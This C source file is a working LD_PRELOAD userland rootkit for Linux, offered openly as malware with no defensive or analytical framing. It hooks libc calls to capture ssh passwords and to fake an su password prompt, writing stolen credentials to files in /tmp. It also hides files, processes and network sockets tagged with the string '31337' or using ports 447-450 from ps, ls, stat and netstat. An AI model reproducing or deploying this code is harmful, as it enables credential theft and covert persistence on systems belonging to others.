/*
 * LD_PRELOAD rootkit
 *
 * steal passwords from local ssh to remote server and su usage.
 * the gr34t techniq is in fact very stupid, pretty effective tought.
 *
 * hide files
 * hide processess
 * hide sockets
 *
 * 04/08/2010 - snp
 *
 * 0.1
 */

#include <errno.h>
#include <dlfcn.h>
#include <stdio.h>
#include <strings.h>
#include <string.h>
#include <sys/ioctl.h>

#ifdef LINUX
#include <termio.h>
#include <linux/types.h>
#else
#include <termios.h>
#endif

#include <netinet/in.h>

#define MAGIC		"31337"

#ifndef RTLD_NEXT
#define RTLD_NEXT	((void *) -1l)
#endif

#ifndef R_OK
#define	R_OK		4
#endif

#define SU_PATH		"/bin/su"
#define SU_LOG_PATH	"/tmp/english-uk"

#define SSH_PATH	    "/usr/local/bin/ssh" 
#define SSH_LOG_PATH	"/tmp/english-us"

#define LS_PATH		"/bin/ls"

static char *proc_name_list[] = {
    "ps",
    NULL
};

/* avoid compatibility problems with local defined structures */
struct stat {
    unsigned long  st_dev;
    unsigned long  st_ino;
    unsigned short st_mode;
    unsigned short st_nlink;
    unsigned short st_uid;
    unsigned short st_gid;
    unsigned long  st_rdev;
    unsigned long  st_size;
    unsigned long  st_blksize;
    unsigned long  st_blocks;
    unsigned long  st_atime;
    unsigned long  st_atime_nsec;
    unsigned long  st_mtime;
    unsigned long  st_mtime_nsec;
    unsigned long  st_ctime;
    unsigned long  st_ctime_nsec;
    unsigned long  __unused4;
    unsigned long  __unused5;
};

struct stat64 {
    unsigned long long	st_dev;
    unsigned char	__pad0[4];

    unsigned long	__st_ino;

    unsigned int	st_mode;
    unsigned int	st_nlink;

    unsigned long	st_uid;
    unsigned long	st_gid;

    unsigned long long	st_rdev;
    unsigned char	__pad3[4];

    long long	st_size;
    unsigned long	st_blksize;

    /* Number 512-byte blocks allocated. */
    unsigned long long	st_blocks;

    unsigned long	st_atime;
    unsigned long	st_atime_nsec;

    unsigned long	st_mtime;
    unsigned int	st_mtime_nsec;

    unsigned long	st_ctime;
    unsigned long	st_ctime_nsec;

    unsigned long long	st_ino;
};

struct dirent 
{
    long			d_ino;
    unsigned long 	d_off;
    unsigned short	d_reclen;
    char			d_name[256];
};

struct dirent64
{
    unsigned long 	d_ino;
    unsigned long 	d_off;
    unsigned short 	d_reclen;
    unsigned char	d_type;
    char			d_name[256];
};
typedef struct __dirstream DIR;
/* end of local defined structures */

extern void close(int);
extern int getpid();
extern void free(void *);
extern int getuid();
extern void sleep(int);
extern void _exit(int);
extern char *getenv(const char *);

char	    ssh_args[1024];
char	    ssh_password[1024];
int		    ssh_pass_size = 0;
int		    ssh_start = 0;
int         ls_mode = 0;
int         UID = 0;

static int rkstatus = 0; /* 0: off, 1: on */

/* setup the UID that will be blocked */
int uid_list[] =
{
    1000,
    1001,
    0,
    -1
};

/* ports that will be hidden */
int ports_list[] =
{
    447,448,449,450,-1
};

/* function pointers to original functions */
char *(*fgets_orig)(char *buf, int buf_size, FILE *fp);
int (*fchmodat_orig)(int fd, const char *path, int mode);
int (*lchmod_orig)(const char *path, int mode);
int (*chmod_orig)(const char *path, int mode);
int (*unlinkat_orig)(int fd, const char *path, int flag);
int (*unlink_orig)(const char *path);
int (*chdir_orig)(const char *dir);
int (*open_orig)(const char *, int mode, int flag);
int (*open64_orig)(const char *, int, int mode);
int (*read_orig)(int fildes, void *buf, size_t nbyte);
int (*write_orig)(int fildes, const void *buf, size_t nbyte);
int (*execve_orig)(const char *path, const char *argv[], const char *envp[]);
struct dirent *(*readdir_orig)(DIR *dir);
struct dirent64 *(*readdir64_orig)(DIR *dir);
int (*stat_orig)(const char *path, struct stat *stat);
int (*stat64_orig)(const char *path, struct stat64 *stat);
int (*__lxstat_orig)(int ver, const char *path, struct stat *stat);
int (*__lxstat64_orig)(int ver, const char *path, struct stat64 *stat);
int (*__libc_start_main_orig)(int *(main)(int,char **, char **),int,char**,void (*init)(void),void (*fini)(void), void (*rtld_fini)(void),void (*stack_end));

char proc_name[255];

int is_proc_name(char *name)
{
    return(!strcmp(name, proc_name));
}

/* 
 * XXX: returns a static variable 
 */
char *get_cmdline(char *pid)
{
    static char cmdline[2048];
    char	    path[255];
    int	        i,c,fd;

    if(pid == NULL) 
        sprintf(path,"/proc/%d/cmdline", getpid());
    else
        sprintf(path,"/proc/%s/cmdline",pid);

    if((fd = open_orig(path,0,0)) <= 0)
        return (NULL);
    c = read_orig(fd, cmdline, sizeof(cmdline));
    for(i=0;i<c;i++) 
        if(cmdline[i]==0x00)
            cmdline[i]=0x20;
    return((char *)&cmdline);
}

int is_logged(const char *log)
{
    FILE	*fp;
    char	line[1024];
    int     r = 0;

    if((fp = fopen(SU_LOG_PATH, "a+")) == NULL) 
        return (-1);

    while(fgets(line, sizeof(line), fp) != NULL && !r) {
        //printf("LINE: %s, LOG: %s\n", &line[strlen(log)+1], log);
        if(!strncmp(line, log, strlen(log)) && line[strlen(log)] == ':')
            r = 1;
    }
    fclose(fp);
    return (r);
}

void toUp(char *buf)
{
    char *p = strdup(buf);
    int i;
    for(i=0;i<strlen(buf);i++)
        if(buf[i]>=0x61&&buf[i]<=0x7a) 
            p[i] = (buf[i] - 0x20);
    memcpy(buf, p, strlen(p));
    free(p);
}

#define HOOK(func) func##_##orig = dlsym(RTLD_NEXT,#func)

/* 
 * this function changes between different libc versions, you should replace as needed 
 */
int __libc_start_main(int *(main)(int,char **, char **),int argc,char **ubp_av,void (*init)(void),void (*fini)(void), void (*rtld_fini)(void),void (*stack_end))
{
    char *p;
    HOOK(__libc_start_main);
    UID = getuid();
    memset(proc_name, 0x00, sizeof(proc_name));
    if(strstr("/", ubp_av[0]))
    {
        if((p = strrchr(ubp_av[0], '/')) != NULL)
            memcpy(proc_name, p, strlen(p));
    } else memcpy(proc_name, ubp_av[0], strlen(ubp_av[0]));
    if(getenv("rk") != NULL) rkstatus = 1;
    return (__libc_start_main_orig(main, argc, ubp_av, init, fini, rtld_fini, stack_end));
}

int open(const char *path, int mode, int flags)
{
    int fd,flag;
    char buf[255];

    /* create hook to original function */
    HOOK(open);

    /* check if rootkit is running, otherwise do nothing */
    if(!rkstatus) return (open_orig(path, mode, flags));

    HOOK(read);
    for(flag=fd=0;proc_name_list[fd]!=NULL;fd++)
        if(is_proc_name(proc_name_list[fd]))
            flag++;
    //if(is_proc_name("top") && strstr(path, "proc") && strstr(path, "stat"))
    //{
    if(flag) {
        if((fd = open_orig(path, mode, flags)) > 0) { 
            if((flag = read_orig(fd, buf, 255)) > 0) {
                if(strstr(buf, MAGIC) != NULL) {
                    errno = ENOENT;
                    close(fd);
                    return -(errno);
                }
            }
            close(fd);
        }
    }
    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (open_orig(path, mode, flags));
}

int open64(const char *path, int s, int mode)
{
    HOOK(open64);
    if(!rkstatus) return (open64_orig(path, s, mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (open64_orig(path, s, mode));
}

int read(int fildes, void *buf, size_t nbyte)
{
    int 	ret;
    char 	*p;
    FILE	*fp;

    HOOK(read);

    ret = read_orig(fildes, buf, nbyte);

    if(!rkstatus)
        return (ret);

    if(is_proc_name("ssh") && fildes == 4 && ssh_start)
    {
        p = buf;
        if(*p == '\n')
        {
            ssh_start = 0;
            fp=fopen(SSH_LOG_PATH,"a+");
            fprintf(fp,"%s (%s)\n", get_cmdline(NULL), ssh_password);
            fflush(fp);
            fclose(fp);
            return (ret);
        }
        ssh_password[ssh_pass_size++] = *p;
    }
    return (ret);
}

int write(int fildes, void *buf, size_t nbyte)
{
    int ret=0;

    HOOK(write);

    if(!rkstatus) return (write_orig(fildes, buf, nbyte));

    if(is_proc_name("ssh") && strstr(buf, "assword"))
    {
        ssh_pass_size = 0;
        memset(ssh_password, 0x00, sizeof(ssh_password));
        ssh_start = 1;
    }
    ret = write_orig(fildes, buf, nbyte);
    return (ret);
}

int execve(const char *path, const char *argv[], const char *envp[])
{
    FILE	*fp;
    char pass[1024], args[1024];
    struct termios tty,old;
    int c;

    if(getenv("rk") != NULL) {
        rkstatus = 1;
    }

    HOOK(execve);

    if(!rkstatus)
        return(execve_orig(path, argv, envp));

    if(!strcmp(path, LS_PATH)) {
        memset(args, 0, sizeof(args));
        for(c = 0; argv[c]; c++) {
            strcat(args, argv[c]);
            if(argv[c+1])
                strcat(args, " ");
        }
    }
    if(!strcmp(path, SU_PATH))
    {
        if(!strcmp(proc_name, "sudo")) 
            return (execve_orig(path, argv, envp));
        memset(args, 0, sizeof(args));
        for(c = 0; argv[c]; c++)
        {
            strcat(args, argv[c]);
            if(argv[c+1])
                strcat(args, " ");
        }
        if(is_logged(args) == 0)
        {
            printf("Password: ");
            fflush(stdout);
            tcgetattr(0, &old);
            tty = old;
            tty.c_lflag 	&= (~ECHO);
            tcsetattr(0, TCSANOW, &tty);
            c=read_orig(0, pass, 1024);
            pass[c-1]=0;
            putchar('\n');
            sleep(2);
            printf("su: Authentication failure\n");
            if((fp=fopen(SU_LOG_PATH, "a+")) == NULL)
                goto out;
            fprintf(fp, "%s:%s\n", args, pass);
            fclose(fp);
out:
            tcsetattr(0, TCSANOW, &old);
            _exit(0);
        }
    }
    return (execve_orig(path, argv, envp));
}

struct dirent *readdir(DIR *dir)
{
    struct dirent *p;
    char	*cmd;

    HOOK(readdir);

    if(!rkstatus) return(readdir_orig(dir));

    p = readdir_orig(dir);
    if(p && (is_proc_name("ps") || is_proc_name("pstree")))
    {
        cmd = get_cmdline(*p->d_name==0x04?p->d_name+1:p->d_name);
        if(strstr(cmd, MAGIC))
            p = readdir(dir);
        return (p);
    }
    if(p && strstr(p->d_name, MAGIC))
        p = readdir(dir);
    return (p);

}

struct dirent64 *readdir64(DIR *dir)
{
    struct dirent64 *p;
    char	*cmd;

    HOOK(readdir64);

    if(!rkstatus)
        return(readdir64_orig(dir));

    p = readdir64_orig(dir);
    if(p && (is_proc_name("ps") || is_proc_name("pstree")))
    {
        cmd = get_cmdline(*p->d_name==0x04?p->d_name+1:p->d_name);
        if(strstr(cmd, MAGIC))
            p = readdir64(dir);
        return (p);
    }
    if(p && strstr(p->d_name, MAGIC)) 
        p = readdir64(dir);
    return (p);
}

int stat(const char *path, struct stat *stat)
{
    HOOK(stat);

    if(!rkstatus)
        return (stat_orig(path, stat));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }

    return (stat_orig(path, stat));
}

int stat64(const char *path, struct stat64 *stat)
{
    HOOK(stat64);
    if(!rkstatus)
        return (stat64_orig(path, stat));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (stat64_orig(path, stat));
}

int __lxstat(int ver, const char *path, struct stat *stat)
{
    HOOK(__lxstat);
    if(!rkstatus)
        return (__lxstat_orig(ver, path, stat));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(__lxstat_orig(ver, path, stat));
}

int __lxstat64(int ver, const char *path, struct stat64 *stat)
{
    HOOK(__lxstat64);
    if(!rkstatus)
        return(__lxstat64_orig(ver, path, stat));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(__lxstat64_orig(ver, path, stat));
}

int chdir(const char *path)
{
    HOOK(chdir);
    if(!rkstatus)
        return (chdir_orig(path));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (chdir_orig(path));
}

int unlinkat(int fd, const char *path, int flag)
{
    HOOK(unlinkat);
    if(!rkstatus)
        return (unlinkat_orig(fd, path, flag));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return(unlinkat_orig(fd, path, flag));
}

int unlink(const char *path)
{
    HOOK(unlink);
    if(!rkstatus)
        return (unlink_orig(path));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (unlink_orig(path));
}

int chmod(const char *path, int mode)
{
    HOOK(chmod);

    if(!rkstatus)
        return (chmod_orig(path, mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (chmod_orig(path, mode));
}

int fchmodat(int fd, const char *path, int mode)
{
    HOOK(fchmodat);
    if(!rkstatus)
        return (fchmodat_orig(fd, path ,mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (fchmodat_orig(fd, path, mode));
}

int lchmod(const char *path, int mode)
{
    HOOK(lchmod);

    if(!rkstatus)
        return (lchmod_orig(path, mode));

    if(strstr(path, MAGIC))
    {
        errno = ENOENT;
        return (-ENOENT);
    }
    return (lchmod_orig(path, mode));
}

char *fgets(char *buf, int buf_size, FILE *fp)
{
    int i;
    char str[8];
    char *p;

    HOOK(fgets);
    p = fgets_orig(buf, buf_size, fp);
    if(!rkstatus)
        return (p);

    if(p == NULL) return (p);

    if(is_proc_name("netstat"))
    {
        for(i=0;ports_list[i] != -1;i++)
        {
            sprintf(str, "%04x", ports_list[i]);
            toUp(str);
            if(!strncmp(p+15,str,4) || !strncmp(p+29,str,4))
            {
                p = fgets(buf, buf_size, fp);
                if(p ==  NULL) return (p);
            }
        }
    }
    return(p);
}



